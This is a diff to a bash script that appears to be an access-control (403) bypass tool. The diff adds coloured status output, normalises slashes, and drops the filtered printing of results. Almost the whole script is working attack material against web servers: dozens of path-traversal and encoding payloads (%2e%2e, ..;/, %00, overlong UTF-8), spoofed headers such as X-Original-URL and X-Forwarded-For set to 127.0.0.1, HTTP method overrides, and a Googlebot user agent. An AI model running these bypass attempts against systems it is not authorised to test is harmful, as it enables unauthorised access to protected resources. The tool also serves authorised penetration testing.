@@ -54,6 +54,9 @@ if [ ${#TARGET_URLS[@]} -eq 0 ]; then
     usage
 fi
 
+GREEN='\033[0;32m'
+NC='\033[0m'
+
 do_curl() {
     local url="$1"
     shift
@@ -75,10 +78,21 @@ char_to_percent() {
     printf '%%%02X' "'$char"
 }
 
+format_status() {
+    local status="$1"
+    if [ "$status" = "200" ]; then
+        echo -e "${GREEN}${status}${NC}"
+    else
+        echo "$status"
+    fi
+}
+
 process_url() {
     local FULL_URL="$1"
     local BASE_URL=$(echo "$FULL_URL" | grep -oE '^https?://[^/]+')
     local PATH_PART="${FULL_URL#$BASE_URL}"
+	PATH_PART="${PATH_PART#/}"
+	PATH_PART="${PATH_PART%/}"
 
     if [ -z "$PATH_PART" ]; then
         echo "Error: URL must contain a path part after the domain: $FULL_URL"
@@ -87,7 +101,8 @@ process_url() {
 
     echo ""
     read -r baseline_status baseline_size < <(do_curl "$FULL_URL")
-    echo "Target URL: $FULL_URL [$baseline_status] [$baseline_size]"
+    formatted_status=$(format_status "$baseline_status")
+    echo -e "Target URL: $FULL_URL [$formatted_status] [$baseline_size]"
 
     local ENCODED_LAST_CHAR=""
     local path_for_encode="$PATH_PART"
@@ -104,57 +119,59 @@ process_url() {
     fi
 
     declare -a URLS=(
-        "${BASE_URL}${PATH_PART}"
-        "${BASE_URL}/%2e${PATH_PART}"
-        "${BASE_URL}${PATH_PART}/."
+        "${BASE_URL}/${PATH_PART}"
+        "${BASE_URL}/%2e/${PATH_PART}"
+        "${BASE_URL}/${PATH_PART}/."
         "${BASE_URL}/${PATH_PART}/"
-        "${BASE_URL}/.${PATH_PART}/./"
-        "${BASE_URL}${PATH_PART}%20"
-        "${BASE_URL}${PATH_PART}%09"
-        "${BASE_URL}${PATH_PART}?"
-        "${BASE_URL}${PATH_PART}.html"
-        "${BASE_URL}${PATH_PART}/?anything"
-        "${BASE_URL}${PATH_PART}#"
-        "${BASE_URL}${PATH_PART}/*"
-        "${BASE_URL}${PATH_PART}.php"
-        "${BASE_URL}${PATH_PART}.json"
-        "${BASE_URL}${PATH_PART}..;/"
-        "${BASE_URL}${PATH_PART};/"
-        "${BASE_URL}${PATH_PART}%2f"
-        "${BASE_URL}${PATH_PART}%252f"
-        "${BASE_URL}${PATH_PART}%00"
-        "${BASE_URL}${PATH_PART}%0a"
-        "${BASE_URL}${PATH_PART}%2e%2e%2f"
-        "${BASE_URL}${PATH_PART}%2e%2e/"
-        "${BASE_URL}${PATH_PART}/../"
-        "${BASE_URL}${PATH_PART}/../../"
-        "${BASE_URL}${PATH_PART}%3f"
-        "${BASE_URL}${PATH_PART}%23"
-        "${BASE_URL}${PATH_PART}/~"
-        "${BASE_URL}${PATH_PART}%7e"
-        "${BASE_URL}${PATH_PART}.bak"
-        "${BASE_URL}${PATH_PART}.old"
-        "${BASE_URL}${PATH_PART}.orig"
-        "${BASE_URL}${PATH_PART}.tmp"
-        "${BASE_URL}${PATH_PART}~"
-        "${BASE_URL}${PATH_PART}/index.html"
-        "${BASE_URL}${PATH_PART}/index.php"
-        "${BASE_URL}${PATH_PART}/default.html"
-        "${BASE_URL}${PATH_PART}%c0%ae"
-        "${BASE_URL}${PATH_PART}%e0%80%ae"
-        "${BASE_URL}${PATH_PART}/./"
-        "${BASE_URL}${PATH_PART}//"
-        "${BASE_URL}${PATH_PART}////"
-        "${BASE_URL}/..${PATH_PART}"
-        "${BASE_URL}/%2e%2e${PATH_PART}"
-        "${BASE_URL}/.${PATH_PART}"
-        "${BASE_URL}/%2e${PATH_PART}"
-        "${BASE_URL}///${PATH_PART}"
+        "${BASE_URL}/./${PATH_PART}/./"
+        "${BASE_URL}/${PATH_PART}%20"
+        "${BASE_URL}/${PATH_PART}%09"
+        "${BASE_URL}/${PATH_PART}?"
+        "${BASE_URL}/${PATH_PART}.html"
+        "${BASE_URL}/${PATH_PART}/?anything"
+        "${BASE_URL}/${PATH_PART}#"
+        "${BASE_URL}/${PATH_PART}/*"
+        "${BASE_URL}/${PATH_PART}.php"
+        "${BASE_URL}/${PATH_PART}.json"
+        "${BASE_URL}/${PATH_PART}..;/"
+        "${BASE_URL}/${PATH_PART};/"
+        "${BASE_URL}/${PATH_PART}%2f"
+        "${BASE_URL}/${PATH_PART}%252f"
+        "${BASE_URL}/${PATH_PART}%00"
+        "${BASE_URL}/${PATH_PART}%0a"
+        "${BASE_URL}/${PATH_PART}%2e%2e%2f"
+        "${BASE_URL}/${PATH_PART}%2e%2e/"
+        "${BASE_URL}/${PATH_PART}/../"
+        "${BASE_URL}/${PATH_PART}/../../"
+        "${BASE_URL}/${PATH_PART}%3f"
+        "${BASE_URL}/${PATH_PART}%23"
+        "${BASE_URL}/${PATH_PART}/~"
+        "${BASE_URL}/${PATH_PART}%7e"
+        "${BASE_URL}/${PATH_PART}.bak"
+        "${BASE_URL}/${PATH_PART}.old"
+        "${BASE_URL}/${PATH_PART}.orig"
+        "${BASE_URL}/${PATH_PART}.tmp"
+        "${BASE_URL}/${PATH_PART}~"
+        "${BASE_URL}/${PATH_PART}/index.html"
+        "${BASE_URL}/${PATH_PART}/index.php"
+        "${BASE_URL}/${PATH_PART}/default.html"
+        "${BASE_URL}/${PATH_PART}%c0%ae"
+        "${BASE_URL}/${PATH_PART}%e0%80%ae"
+        "${BASE_URL}/${PATH_PART}/./"
+        "${BASE_URL}/${PATH_PART}//"
+        "${BASE_URL}/${PATH_PART}////"
+        "${BASE_URL}/../${PATH_PART}"
+		"${BASE_URL}/..${PATH_PART}"
+        "${BASE_URL}/%2e%2e/${PATH_PART}"
+        "${BASE_URL}/./${PATH_PART}"
+		"${BASE_URL}/.${PATH_PART}"
+        "${BASE_URL}/%2e/${PATH_PART}"
+        "${BASE_URL}////${PATH_PART}"
+		"${BASE_URL}//////////${PATH_PART}"
         "${BASE_URL}//${PATH_PART}"
         "${BASE_URL}/./${PATH_PART}"
         "${BASE_URL}/%2e/${PATH_PART}"
         "${BASE_URL}/;/${PATH_PART}"
-        "${BASE_URL}/../${PATH_PART}"
         "${BASE_URL}/%2e%2e/${PATH_PART}"
         "${BASE_URL}/..;/${PATH_PART}"
         "${BASE_URL}/~/${PATH_PART}"
@@ -173,36 +190,28 @@ process_url() {
     )
 
     if [ -n "$ENCODED_LAST_CHAR" ]; then
-        URLS+=("${BASE_URL}${ENCODED_LAST_CHAR}")
+        URLS+=("${BASE_URL}/${ENCODED_LAST_CHAR}")
     fi
 
     for url in "${URLS[@]}"; do
         read -r response size < <(do_curl "$url")
-
-        if [ "$VERBOSE" = true ]; then
-            printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-        else
-            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-            fi
-        fi
+        formatted_status=$(format_status "$response")
+        printf "[%b] [%s] %s\n" "$formatted_status" "$size" "$url"
     done
 
     declare -A HEADERS=(
-        ["X-Original-URL"]="$PATH_PART"
+        ["X-Original-URL"]="/$PATH_PART"
         ["X-Custom-IP-Authorization"]="127.0.0.1"
         ["X-Forwarded-For"]="127.0.0.1"
         ["X-Forwarded-For-Port"]="127.0.0.1:80"
-        ["X-rewrite-url"]="$PATH_PART"
+        ["X-rewrite-url"]="/$PATH_PART"
         ["X-Host"]="127.0.0.1"
         ["X-Http-Method-Override"]="GET"
         ["X-Http-Method-Override-PUT"]="PUT"
         ["X-Http-Method-Override-PATCH"]="PATCH"
         ["X-Http-Method-Override-POST"]="POST"
         ["X-Forwarded-Prefix"]="/$PATH_PART"
-        ["Referrer"]="${BASE_URL}${PATH_PART}"
+        ["Referrer"]="${BASE_URL}/${PATH_PART}"
         ["Origin"]="${BASE_URL}"
         ["X-Real-IP"]="127.0.0.1"
         ["X-Originating-IP"]="127.0.0.1"
@@ -223,8 +232,8 @@ process_url() {
         ["X-Url-Scheme"]="https"
         ["X-Forwarded"]="for=127.0.0.1;host=${BASE_URL#*://};proto=https"
         ["Forwarded"]="for=127.0.0.1;host=${BASE_URL#*://};proto=https"
-        ["X-Override-URL"]="$PATH_PART"
-        ["X-Rewrite-URL"]="$PATH_PART"
+        ["X-Override-URL"]="/$PATH_PART"
+        ["X-Rewrite-URL"]="/$PATH_PART"
         ["X-HTTP-Method-Override"]="GET"
         ["X-HTTP-Method-Override-PUT"]="PUT"
         ["X-HTTP-Method-Override-PATCH"]="PATCH"
@@ -250,21 +259,13 @@ process_url() {
         ["User-Agent"]="Googlebot/2.1 (+http://www.google.com/bot.html)"
     )
 
-    url="${BASE_URL}${PATH_PART}"
+    url="${BASE_URL}/${PATH_PART}"
     for header in "${!HEADERS[@]}"; do
         value="${HEADERS[$header]}"
         header_name="$header"
         read -r response size < <(do_curl "$url" "$header_name: $value")
-
-        if [ "$VERBOSE" = true ]; then
-            printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
-        else
-            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
-            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s -H %s: %s\n" "$response" "$size" "$url" "$header_name" "$value"
-            fi
-        fi
+        formatted_status=$(format_status "$response")
+        printf "[%b] [%s] %s -H %s: %s\n" "$formatted_status" "$size" "$url" "$header_name" "$value"
     done
 
     declare -a METHODS=(
@@ -286,47 +287,28 @@ process_url() {
     for method_line in "${METHODS[@]}"; do
         IFS='|' read -r method params <<< "$method_line"
         read -r response size < <(eval "curl -k -s -o /dev/null -w \"%{http_code} %{size_download}\" -X $method $params \"$url\" 2>/dev/null || echo '000 0'")
-
-        if [ "$VERBOSE" = true ]; then
-            printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
-        else
-            if [[ "$response" == "0000" ]] || [[ "$size" =~ 0000 ]]; then
-                continue
-            fi
-            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
-            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s -X %s %s\n" "$response" "$size" "$url" "$method" "$params"
-            fi
-        fi
+        formatted_status=$(format_status "$response")
+        printf "[%b] [%s] %s -X %s %s\n" "$formatted_status" "$size" "$url" "$method" "$params"
     done
 
     uppercase_path=$(echo "$PATH_PART" | tr '[:lower:]' '[:upper:]')
     lowercase_path=$(echo "$PATH_PART" | tr '[:upper:]' '[:lower:]')
 
     for variant in "$uppercase_path" "$lowercase_path"; do
-        url="${BASE_URL}${variant}"
+        url="${BASE_URL}/${variant}"
         read -r response size < <(do_curl "$url")
-
-        if [ "$VERBOSE" = true ]; then
-            printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-        else
-            if [ "$response" = "200" ] && [ "$response" != "$baseline_status" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-            elif [ "$size" != "$baseline_size" ] && [ "$response" != "000" ] && [ "$size" != "0" ]; then
-                printf "[%s] [%s] %s\n" "$response" "$size" "$url"
-            fi
-        fi
+        formatted_status=$(format_status "$response")
+        printf "[%b] [%s] %s\n" "$formatted_status" "$size" "$url"
     done
 
-    wayback_response=$(curl -s "https://archive.org/wayback/available?url=${BASE_URL}${PATH_PART}" 2>/dev/null)
+    wayback_response=$(curl -s "https://archive.org/wayback/available?url=${BASE_URL}/${PATH_PART}" 2>/dev/null)
 
     if [[ -n "$wayback_response" && "$wayback_response" != "null" ]]; then
         available=$(echo "$wayback_response" | jq -r '.archived_snapshots.closest.available // "false"' 2>/dev/null)
         snapshot_url=$(echo "$wayback_response" | jq -r '.archived_snapshots.closest.url // empty' 2>/dev/null)
 
         if [[ "$available" == "true" && -n "$snapshot_url" && "$snapshot_url" != "empty" ]]; then
-            echo "Wayback Machine snapshot: $snapshot_url"
+            echo "└── Wayback Machine: $snapshot_url"
         fi
     fi
 }
